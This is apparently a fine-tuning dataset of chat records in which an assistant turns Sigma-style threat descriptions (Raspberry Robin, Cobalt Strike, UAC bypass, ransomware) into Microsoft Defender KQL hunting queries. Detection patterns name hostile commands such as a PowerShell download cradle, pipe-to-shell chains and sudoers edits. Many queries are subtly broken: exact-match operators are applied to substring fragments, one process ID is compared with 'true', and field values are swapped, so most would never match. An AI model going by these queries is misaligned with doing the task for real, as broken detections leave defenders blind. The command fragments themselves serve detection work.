{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects raspberry robin subsequent execution of commands. Topic: proc_creation_win_malware_raspberry_robin_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"-a\" or ProcessCommandLine endswith \"/a\" or ProcessCommandLine endswith \"\u2013a\" or ProcessCommandLine endswith \"\u2014a\" or ProcessCommandLine endswith \"\u2015a\" or ProcessCommandLine endswith \"-f\" or ProcessCommandLine endswith \"/f\" or ProcessCommandLine endswith \"\u2013f\" or ProcessCommandLine endswith \"\u2014f\" or ProcessCommandLine endswith \"\u2015f\" or ProcessCommandLine endswith \"-s\" or ProcessCommandLine endswith \"/s\" or ProcessCommandLine endswith \"\u2013s\" or ProcessCommandLine endswith \"\u2014s\" or ProcessCommandLine endswith \"\u2015s\") and InitiatingProcessFileName =~ \"\\\\fodhelper.exe\" and (ProcessCommandLine in~ (\"installdriver\", \"setfiledsndir\", \"vkipdse\")) and (InitiatingProcessFolderPath in~ (\"\\\\rundll32.exe\", \"\\\\regsvr32.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific command line execution used by Lace Tempest to download Cobalt Strike as reported by SysAid Team Topic: proc_creation_win_apt_lace_tempest_cobalt_strike_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\", \"/a')\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious curl process start on Windows and outputs the requested document to a local file Topic: proc_creation_win_curl_susp_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoProductName =~ \"The curl executable\") and ((ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".gif\" or ProcessCommandLine endswith \".jpeg\" or ProcessCommandLine endswith \".jpg\" or ProcessCommandLine endswith \".png\" or ProcessCommandLine endswith \".temp\" or ProcessCommandLine endswith \".tmp\" or ProcessCommandLine endswith \".txt\" or ProcessCommandLine endswith \".vbe\" or ProcessCommandLine endswith \".vbs\") or (ProcessCommandLine in~ (\"%AppData%\", \"%Public%\", \"%Temp%\", \"%tmp%\", \"\\\\AppData\\\\\", \"\\\\Desktop\\\\\", \"\\\\Temp\\\\\", \"\\\\Users\\\\Public\\\\\", \"C:\\\\PerfLogs\\\\\", \"C:\\\\ProgramData\\\\\", \"C:\\\\Windows\\\\Temp\\\\\"))) and (not((FolderPath =~ \"C:\\\\Program Files\\\\Git\\\\mingw64\\\\bin\\\\curl.exe\" and InitiatingProcessFileName =~ \"C:\\\\Program Files\\\\Git\\\\usr\\\\bin\\\\sh.exe\" and (ProcessCommandLine in~ (\"--silent --show-error --output \", \"gfw-httpget-\", \"AppData\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the Impersonate tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively Topic: proc_creation_win_hktl_impersonate"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"impersonate.exe\" and (ProcessCommandLine in~ (\" list \", \" exec \", \" adduser \"))) or (MD5 startswith \"9520714AB576B0ED01D1513691377D01\" or SHA256 startswith \"E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a ZxShell start by the called and well-known function name Topic: proc_creation_win_apt_zxshell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"zxFunction\", \"RemoteDiskXXXXX\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects launch of the PSEXESVC service, which means that this system was the target of a psexec remote execution Topic: proc_creation_win_sysinternals_psexesvc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath =~ \"C:\\\\Windows\\\\PSEXESVC.exe\" or ProcessVersionInfoOriginalFileName =~ \"psexesvc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths.\n Topic: proc_creation_win_wusa_cab_files_extraction_from_susp_paths"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\":\\\\PerfLogs\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\Appdata\\\\Local\\\\Temp\\\\\")) and (ProcessCommandLine =~ \"/extract:\" and InitiatingProcessFolderPath =~ \"\\\\wusa.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"BitLockerToGo.EXE\".\nBitLocker To Go is BitLocker Drive Encryption on removable data drives. This feature includes the encryption of, USB flash drives, SD cards, External hard disk drives, Other drives that are formatted by using the NTFS, FAT16, FAT32, or exFAT file system.\nThis is a rarely used application and usage of it at all is worth investigating.\nMalware such as Lumma stealer has been seen using this process as a target for process hollowing.\n Topic: proc_creation_win_bitlockertogo_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\BitLockerToGo.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \"shortcuts\" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries. Topic: proc_creation_win_susp_arbitrary_shell_execution_via_settingcontent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \".SettingContent-ms\" and (not(ProcessCommandLine =~ \"immersivecontrolpanel\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: file_event_win_gotoopener_artefact"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\LogMeInInc\\\\GoToAssist Remote Support Expert\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when the DLL export function DllRegisterServer is called in the commandline by Rundll32 explicitly where the DLL is located in a non-standard path.\n Topic: proc_creation_win_rundll32_dllregisterserver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"DllRegisterServer\" and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")) and (not((ProcessCommandLine in~ (\":\\\\Program Files (x86)\", \":\\\\Program Files\\\\\", \":\\\\Windows\\\\System32\\\\\", \":\\\\Windows\\\\SysWOW64\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a code page switch in command line or batch scripts to a rare language Topic: proc_creation_win_chcp_codepage_switch"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \" 936\" or ProcessCommandLine endswith \" 1258\") and InitiatingProcessFolderPath =~ \"\\\\chcp.com\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tools such as UACMe used to bypass UAC with computerdefaults.exe (UACMe 59) Topic: proc_creation_win_uac_bypass_computerdefaults"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath =~ \"C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\"))) and (not((InitiatingProcessFileName in~ (\":\\\\Windows\\\\System32\", \":\\\\Program Files\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects filename indicators associated with the SNAKE malware as reported by CISA in their report Topic: file_event_win_malware_snake_installers_ioc"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\jpsetup.exe\", \"\\\\jpinst.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of the PROCEXP152.sys file in the application-data local temporary folder.\nThis driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU) or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU.\n Topic: file_event_win_susp_procexplorer_driver_created_in_tmp_folder"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"PROCEXP152.sys\" and (not((InitiatingProcessFolderPath contains \"\\\\procexp64.exe\" or InitiatingProcessFolderPath contains \"\\\\procexp.exe\" or InitiatingProcessFolderPath contains \"\\\\procmon64.exe\" or InitiatingProcessFolderPath contains \"\\\\procmon.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects loading of \"Amsi.dll\" by a living of the land process. This could be an indication of a \"PowerShell without PowerShell\" attack Topic: image_load_dll_amsi_suspicious_process"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\amsi.dll\" and (InitiatingProcessFolderPath in~ (\"\\\\ExtExport.exe\", \"\\\\odbcconf.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet. Topic: registry_set_clickonce_trust_prompt"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\MICROSOFT\\\\.NETFramework\\\\Security\\\\TrustManager\\\\PromptingLevel*\" and (RegistryKey endswith \"\\\\Internet\" or RegistryKey endswith \"\\\\LocalIntranet\" or RegistryKey endswith \"\\\\MyComputer\" or RegistryKey endswith \"\\\\TrustedSites\" or RegistryKey endswith \"\\\\UntrustedSites\") and RegistryValueData =~ \"Enabled\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL side loading of \"KeyScramblerIE.dll\" by \"KeyScrambler.exe\".\nVarious threat actors and malware have been found side loading a masqueraded \"KeyScramblerIE.dll\" through \"KeyScrambler.exe\".\n Topic: image_load_side_load_keyscrambler"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\KeyScramblerIE.dll\" and (InitiatingProcessFolderPath in~ (\"\\\\KeyScrambler.exe\", \"\\\\KeyScramblerLogon.exe\"))) and (not((((FolderPath contains \"C:\\\\Program Files (x86)\\\\KeyScrambler\\\\\" or FolderPath contains \"C:\\\\Program Files\\\\KeyScrambler\\\\\") and (InitiatingProcessFolderPath contains \"C:\\\\Program Files (x86)\\\\KeyScrambler\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\KeyScrambler\\\\\")) or (InitiatingProcessVersionInfoCompanyName =~ \"Valid\" and InitiatingProcessVersionInfoOriginalFileName =~ \"QFX Software Corporation\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the modification of the registry to allow a driver or service to persist in Safe Mode. Topic: registry_set_add_load_service_in_safe_mode"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey endswith \"\\\\Control\\\\SafeBoot\\\\Minimal*\" or RegistryKey endswith \"\\\\Control\\\\SafeBoot\\\\Network*\") and RegistryKey endswith \"\\\\(Default)\" and RegistryValueData =~ \"Service\") and (not((InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\msiexec.exe\" and (RegistryKey endswith \"\\\\Control\\\\SafeBoot\\\\Minimal\\\\SAVService\\\\(Default)\" or RegistryKey endswith \"\\\\Control\\\\SafeBoot\\\\Network\\\\SAVService\\\\(Default)\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a file named \"wpbbin\" in the \"%systemroot%\\system32\\\" directory. Which could be indicative of UEFI based persistence method Topic: file_event_win_wpbbin_persistence"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\Windows\\\\System32\\\\wpbbin.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,\nUsee to Query/modify DNS records for Active Directory integrated DNS via LDAP\n Topic: proc_creation_win_python_adidnsdump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"adidnsdump\" and InitiatingProcessFolderPath =~ \"\\\\python.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by \"wordpad.exe\" over uncommon destination ports.\nThis might indicate potential process injection activity from a beacon or similar mechanisms.\n Topic: net_connection_win_wordpad_uncommon_ports"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\wordpad.exe\") and (not((RemotePort in~ (\"80\", \"139\", \"443\", \"445\", \"465\", \"587\", \"993\", \"995\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a file or folders permissions being modified or tampered with. Topic: proc_creation_win_susp_file_permission_modifications"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine in~ (\"/grant\", \"/setowner\", \"/inheritance:r\")) and (InitiatingProcessFolderPath in~ (\"\\\\cacls.exe\", \"\\\\icacls.exe\", \"\\\\net.exe\", \"\\\\net1.exe\"))) or (ProcessCommandLine =~ \"-r\" and InitiatingProcessFolderPath =~ \"\\\\attrib.exe\") or InitiatingProcessFolderPath =~ \"\\\\takeown.exe\") and (not(((ProcessCommandLine in~ (\":\\\\Program Files (x86)\\\\Avira\", \":\\\\Program Files\\\\Avira\")) or ProcessCommandLine endswith \"ICACLS C:\\\\ProgramData\\\\dynatrace\\\\gateway\\\\config\\\\connectivity.history /reset\" or (ProcessCommandLine in~ (\"ICACLS C:\\\\ProgramData\\\\dynatrace\\\\gateway\\\\config\\\\config.properties /grant :r \", \"S-1-5-19:F\")) or (ProcessCommandLine in~ (\"\\\\AppData\\\\Local\\\\Programs\\\\Microsoft VS Code\", \":\\\\Program Files\\\\Microsoft VS Code\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the installation of VsCode tunnel (code-tunnel) as a service. Topic: proc_creation_win_vscode_tunnel_service_install"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"tunnel \", \"service\", \"internal-run\", \"tunnel-service.log\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file creation activity that is related to Onyx Sleet APT activity Topic: file_event_win_apt_onyx_sleet_indicators"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \":\\\\Windows\\\\ADFS\\\\bg\\\\inetmgr.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument Topic: proc_creation_win_agentexecutor_potential_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" -powershell\", \" -remediationScript\")) and (FolderPath =~ \"\\\\AgentExecutor.exe\" or ProcessVersionInfoOriginalFileName =~ \"AgentExecutor.exe\")) and (not(InitiatingProcessFileName =~ \"\\\\Microsoft.Management.Services.IntuneWindowsAgent.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL bypass and is listed in Microsofts recommended block rules. Topic: proc_creation_win_lolbin_visualuiaverifynative"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\VisualUiaVerifyNative.exe\" or ProcessVersionInfoOriginalFileName =~ \"VisualUiaVerifyNative.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a user downloads a file from an IP based URL using CertOC.exe Topic: proc_creation_win_certoc_download_direct_ip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"-GetCACAPS\" and (FolderPath endswith \"\\\\certoc.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertOC.exe\") and ProcessCommandLine matches regex \"://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon. Topic: proc_creation_win_regsvr32_flags_anomaly"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \" -i:\" or ProcessCommandLine contains \" /i:\" or ProcessCommandLine contains \" \u2013i:\" or ProcessCommandLine contains \" \u2014i:\" or ProcessCommandLine contains \" \u2015i:\") and InitiatingProcessFolderPath =~ \"\\\\regsvr32.exe\") and (not(ProcessCommandLine contains \" -n \" or ProcessCommandLine contains \" /n \" or ProcessCommandLine contains \" \u2013n \" or ProcessCommandLine contains \" \u2014n \" or ProcessCommandLine contains \" \u2015n \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the setting of the \"ImagePath\" value of a service registry key to a path controlled by a non-administrator user such as \"\\AppData\\\" or \"\\ProgramData\\\".\nAttackers often use such directories for staging purposes.\nThis rule might also trigger on badly written software, where if an attacker controls an auto starting service, they might achieve persistence or privilege escalation.\nNote that while ProgramData is a user controlled folder, software might apply strict ACLs which makes them only accessible to admin users. Remove such folders via filters if you experience a lot of noise.\n Topic: registry_set_service_image_path_user_controlled_folder"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey contains \"ControlSet\" and RegistryKey endswith \"\\\\Services*\") and RegistryKey endswith \"\\\\ImagePath\" and (RegistryValueData contains \":\\\\ProgramData\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Local\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Roaming\\\\\")) and (not(((RegistryKey endswith \"\\\\Services\\\\WinDefend*\" or RegistryKey contains \"\\\\Services\\\\MpKs\") and RegistryValueData contains \"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\\"))) and (not(((RegistryKey contains \"\\\\Services\\\\ZoomCptService\" and RegistryValueData contains \"C:\\\\Program Files\\\\Common Files\\\\Zoom\\\\Support\\\\CptService.exe\") or (RegistryKey contains \"\\\\Services\\\\MBAMInstallerService\" and (RegistryValueData contains \"C:\\\\Users\\\\\" and RegistryValueData contains \"AppData\\\\Local\\\\Temp\\\\MBAMInstallerService.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"logman\" utility in order to disable or delete Windows trace sessions Topic: proc_creation_win_logman_disable_eventlog"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"stop \", \"delete \")) and (FolderPath endswith \"\\\\logman.exe\" or ProcessVersionInfoOriginalFileName =~ \"Logman.exe\") and (ProcessCommandLine in~ (\"Circular Kernel Context Logger\", \"EventLog-\", \"SYSMON TRACE\", \"SysmonDnsEtwSession\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects logon events that specify new credentials Topic: win_security_susp_logon_newcredentials"}, {"role": "assistant", "content": "DeviceLogonEvents\n| where LogonType == 9"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects WmiPrvSE spawning a process Topic: proc_creation_win_wmiprvse_spawning_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\WmiPrvSe.exe\" and (not(((InitiatingProcessSessionId in~ (\"0x3e7\", \"null\")) or isnull(InitiatingProcessSessionId) or (InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) or InitiatingProcessFolderPath =~ \"\\\\WerFault.exe\" or InitiatingProcessFolderPath =~ \"\\\\WmiPrvSE.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes of sensitive and critical files. Monitors files that you dont expect to change without planning on Linux system. Topic: proc_creation_lnx_susp_sensitive_file_access"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine =~ \">\" and (InitiatingProcessFolderPath in~ (\"/cat\", \"/echo\", \"/grep\", \"/head\", \"/more\", \"/tail\"))) or (InitiatingProcessFolderPath in~ (\"/emacs\", \"/nano\", \"/sed\", \"/vi\", \"/vim\"))) and (ProcessCommandLine in~ (\"/bin/login\", \"/bin/passwd\", \"/boot/\", \"/etc/cron.\", \"/etc/crontab\", \"/etc/hosts\", \"/etc/init.d\", \"/etc/sudoers\", \"/opt/bin/\", \"/sbin\", \"/usr/bin/\", \"/usr/local/bin/\") or (ProcessCommandLine contains \"/etc/\" and ProcessCommandLine contains \".conf\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors Topic: proc_creation_win_iis_susp_module_registration"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\w3wp.exe\" and (ProcessCommandLine =~ \"appcmd.exe add module\" or (ProcessCommandLine =~ \" system.enterpriseservices.internal.publish\" and InitiatingProcessFolderPath =~ \"\\\\powershell.exe\") or (ProcessCommandLine in~ (\"gacutil\", \" /I\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect usage of the \"driverquery\" utility to perform reconnaissance on installed drivers Topic: proc_creation_win_driverquery_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"driverquery.exe\" or ProcessVersionInfoOriginalFileName =~ \"drvqry.exe\") and ((InitiatingProcessFolderPath endswith \"\\\\cscript.exe\" or InitiatingProcessFolderPath endswith \"\\\\mshta.exe\" or InitiatingProcessFolderPath endswith \"\\\\regsvr32.exe\" or InitiatingProcessFolderPath endswith \"\\\\rundll32.exe\" or InitiatingProcessFolderPath endswith \"\\\\wscript.exe\") or (InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\\" or InitiatingProcessFolderPath contains \"\\\\Users\\\\Public\\\\\" or InitiatingProcessFolderPath contains \"\\\\Windows\\\\Temp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential process patterns related to Cobalt Strike beacon activity Topic: proc_creation_win_hktl_cobaltstrike_process_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"conhost.exe 0xffffffff -ForceV1\" and (InitiatingProcessCommandLine in~ (\"cmd.exe /C echo\", \" > \\\\\\\\.\\\\pipe\"))) or (ProcessCommandLine endswith \"conhost.exe 0xffffffff -ForceV1\" and InitiatingProcessCommandLine =~ \"/C whoami\") or (ProcessCommandLine endswith \"cmd.exe /C whoami\" and InitiatingProcessFileName =~ \"C:\\\\Temp\\\\\") or ((InitiatingProcessFileName in~ (\"\\\\runonce.exe\", \"\\\\dllhost.exe\")) and (ProcessCommandLine in~ (\"cmd.exe /c echo\", \"> \\\\\\\\.\\\\pipe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious file creations in the Palo Alto Networks PAN-OS parent telemetry folder, which are processed by the vulnerable dt_curl script if device telemetry is enabled.\nAs said script overrides the shell-subprocess restriction, arbitrary command execution may occur by carefully crafting filenames that are escaped through this function.\n Topic: file_event_paloalto_globalprotect_exploit_cve_2024_3400_command_inject_file_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"/opt/panlogs/tmp/device_telemetry/\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process characteristics of Snatch ransomware word document droppers Topic: proc_creation_win_malware_snatch_ransomware"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"shutdown /r /f /t 00\", \"net stop SuperBackupMan\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell Topic: proc_creation_lnx_susp_pipe_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine startswith \"sh -c \" or ProcessCommandLine startswith \"bash -c \") and ((ProcessCommandLine contains \"| bash \" or ProcessCommandLine contains \"| sh \" or ProcessCommandLine contains \"|bash \" or ProcessCommandLine contains \"|sh \") or (ProcessCommandLine endswith \"| bash\" or ProcessCommandLine endswith \"| sh\" or ProcessCommandLine endswith \"|bash\" or ProcessCommandLine endswith \" |sh\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects indicators of a UAC bypass method by mocking directories Topic: proc_creation_win_uac_bypass_trustedpath"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"C:\\\\Windows \\\\System32\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell core DLL being loaded by an Office Product Topic: image_load_office_powershell_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath contains \"\\\\System.Management.Automation.Dll\" or FolderPath contains \"\\\\System.Management.Automation.ni.Dll\") and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\mspub.exe\", \"\\\\outlook.exe\", \"\\\\onenote.exe\", \"\\\\onenoteim.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects addition of users to the local Remote Desktop Users group via \"Net\" or \"Add-LocalGroupMember\". Topic: proc_creation_win_susp_add_user_remote_desktop_group"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Remote Desktop Users\", \"Utilisateurs du Bureau \u00e0 distance\", \"Usuarios de escritorio remoto\")) and ((ProcessCommandLine contains \"localgroup \" and ProcessCommandLine contains \" /add\") or (ProcessCommandLine contains \"Add-LocalGroupMember \" and ProcessCommandLine contains \" -Group \"))"}]}
